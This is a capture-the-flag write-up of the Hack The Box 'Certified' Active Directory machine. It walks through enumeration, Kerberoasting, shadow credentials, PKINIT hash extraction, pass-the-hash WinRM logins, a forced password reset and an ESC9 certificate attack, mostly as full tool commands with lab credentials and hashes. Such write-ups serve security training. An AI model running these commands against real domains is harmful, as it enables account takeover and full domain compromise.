---
date: 2025-03-02
categories: [Windows, Medium, AD]
---

![Certified](https://labs.hackthebox.com/storage/avatars/28b71ec11bb839b5b58bdfc555006816.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [ruycr4ft](https://app.hackthebox.com/users/1253217)        | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Windows   |

---








- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.41 -oG scan
	nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49668,49673,49674,49683,49713,49737,49770 -sCV -Pn 10.10.11.41 -oN ports
	```
	
	![image](https://github.com/user-attachments/assets/562af0c0-6107-4299-8d61-d07a25081056)

- I have access via smb to the IPC$ folder and thanks to that I am able to enumerate the system
	
	```python
	netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares
	```
	
  ![image](https://github.com/user-attachments/assets/0e02d615-3f70-4cf1-9f6b-3aa37acabf86)
	
	```python
	netexec ldap 10.10.11.41 -u judith.mader -p judith09  --bloodhound --collection All --dns-server 10.10.11.41
	```
	
	![image](https://github.com/user-attachments/assets/70950ca1-9d8e-42c5-91d6-183b5133e0d9)

- Before analyzing with bloodhound, I see on which user I can request a TGS as I have valid credentials.
	
	![image](https://github.com/user-attachments/assets/964b2a67-8a1f-475a-b706-73cc3dd90707)
	
	```python
	rdate -n 10.10.11.41; impacket-GetUserSPNs certified.htb/judith.mader:judith09 -request
	```
	
	![image](https://github.com/user-attachments/assets/329bb3ac-ff7d-48e0-8e7c-3d6d62ef3709)

- I can request it from the management_SVC user and sometimes I can break it and get his password. After completing the whole machine I understand why I can sometimes break the TGS and sometimes not. As this is not the intended way to complete the machine I am not going to follow up on this point

- Analyzing with bloodhound I see that I have “WriteOwner” permission on the management group and then it has “GenericWrite” permission on the management_svc user.
- Thanks to the first one I can change the owner of the object and with the second one I can change the user's password without knowing the current one.
	
	![image](https://github.com/user-attachments/assets/847f8569-77d8-4378-b714-26cd12d0d9fd)

- I start by adding the user judith.mader to the management group with owneredit from impacket
	
	```python
	owneredit.py -action write -new-owner 'judith.mader' -target-dn 'CN=management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
	```
	
	![image](https://github.com/user-attachments/assets/3e47628d-6261-4a3a-81db-51d3c088761a)

- With this I get the user's ticket but I am not able to get his password in clear text.
	
	```python
	rdate -n 10.10.11.41; ./targetedKerberoast.py --dc-ip '10.10.11.41' -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
	```

- By observing that judith has “Owns” and “WriteOwner” permissions on the group managements, and this group has “GenericWrite” permission on the user Management_svc. We can first become a member of the group and get the user's hash. This is known as Kerberos PKINIT.
	
	```python
	pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"  --filename test1
	#request a Ticket-Granting-Ticket (TGT) for the domain controller
	./gettgtpkini.py -cert-pfx test1.pfx -pfx-pass  4l99njREI8ehV7aLoA7a certified.htb/Management_svc Management_svc.ccache
	#set the KRB5CCNAME environment variable,
	export KRB5CCNAME=Management_svc.ccache
	#Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)]which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
	rdate -n 10.10.11.41; ./getnthash.py -key d85b3ba5fcb9c40d666dd6c4d7413c9273276f039ea2342d32dff2723ad291a1 certified.htb/Management_svc
	```

	![image](https://github.com/user-attachments/assets/3ed89ad0-35f6-441e-97b3-3aede681f85e)

- Having already the hash of the user management_svc, I comment myself on WinRM and I manage to read the first flag.

```python
evil-winrm -i 10.10.11.41 -u Management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![image](https://github.com/user-attachments/assets/016dc472-d780-4ea5-9bc2-992b10cc6511)

- Having the credentials of this user, we can move laterally to the ca_operatos user by changing its password.
- By having “GenerilcAll” permission on the user ca_operator, I can set the user's password without knowing the current password.
	
	![image](https://github.com/user-attachments/assets/dfb7e7c0-94b0-46b4-92c5-165abf716a1a)
	
	```python
	pth-net rpc password "ca_operator" "newP@ssword2022" -U certified.htb/management_svc%"a091c1832bcdd4677c28b5a6a1295584":"a091c1832bcdd4677c28b5a6a1295584" -S dc01.certified.htb
	
	crackmapexec smb 10.10.11.41 -u 'ca_operator' -p 'newP@ssword2022'
	```
	
	![image](https://github.com/user-attachments/assets/0f85e58d-c9cb-4d94-8b78-f486ac269d5f)

- With these credentials we enumerate the system in order to add the certificate part to bloodhound.
		
	```python
	rdate -n 10.10.11.41; certipy-ad req -u ca_operator@certified.htb -p newP@ssword2022 -dc-ip 10.10.11.41  -ca certified-DC01-CA -target certified.htb -template User
	crackpkcs12 -d /usr/share/wordlists/rockyou.txt ca_operator.pfx -t 25
	
	#Downlaod the fork version of bloodhound
	rdate -n 10.10.11.41; certipy-ad find -u ca_operator@certified.htb -p newP@ssword2022 -dc-ip 10.10.11.41 -old-bloodhound
	```

- With the certipy tool I search for any vulnerability in the certificate. It tells me that it may be vulnerable to ESC9 
- With the “find” option you can list AD CS certificate templates, certificate authorities and other settings
	
	```python
	certipy-ad find -u ca_operator -p 'newP@ssword2022' -dc-ip 10.10.11.41 -stdout -enabled -vulnerable
	```
	
	![image](https://github.com/user-attachments/assets/ea342568-037e-41f9-9cf8-f7d2dfbec237)

- To exploit this vulnerability I get help from this [page](https://adminions.ca/books/adcs-abusing-active-directory-certificate-service/page/esc9) that tells me the steps to execute.

	```python
	rdate -n 10.10.11.41; certipy-ad shadow auto -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -account ca_operator
	
	certipy-ad account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn administrator
	
	
	certipy-ad req -username "ca_operator@certified.htb" -hashes "01794af19fd00af4f2528923c4ef08be" -target "certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'    
	
	certipy-ad account update -username "management_svc@certified.htb" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user ca_operator -upn "ca_operator@certified.htb" 
	
	
	rdate -n 10.10.11.41; certipy-ad auth -pfx  ca_operator.pfx -domain certified.htb
	```
	
	![image](https://github.com/user-attachments/assets/fcd30e2a-da51-49ef-9acd-664161b4967c)

	![image](https://github.com/user-attachments/assets/9d3892e7-f36a-4687-bcbe-593785b7ac09)

- After validating and confirming that the ntlm hash is correct for the administrator user, I connect to the system and get to read the second flag
	
	```python
	 evil-winrm -i 10.10.11.41 -u administrator -H "0d5b49608bbce1751f708748f67e2d34"
	```
